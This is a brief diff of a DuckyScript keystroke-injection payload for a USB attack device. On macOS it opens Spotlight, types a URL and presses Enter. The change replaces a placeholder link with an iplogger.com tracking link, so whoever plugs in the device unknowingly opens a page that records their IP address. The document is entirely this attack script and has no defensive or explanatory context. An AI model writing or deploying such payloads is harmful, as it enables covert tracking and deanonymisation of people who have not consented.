@@ -6,10 +6,11 @@ DELAY 1000
 GUI SPACE
 DELAY 250
 REM Put your link down there ↓
-STRING https://feds.lol
+STRING https://iplogger.com/2qFZJ4
 DELAY 70
 TAB
 DELAY 70
 ENTER
 DELAY 150
 ENTER
+
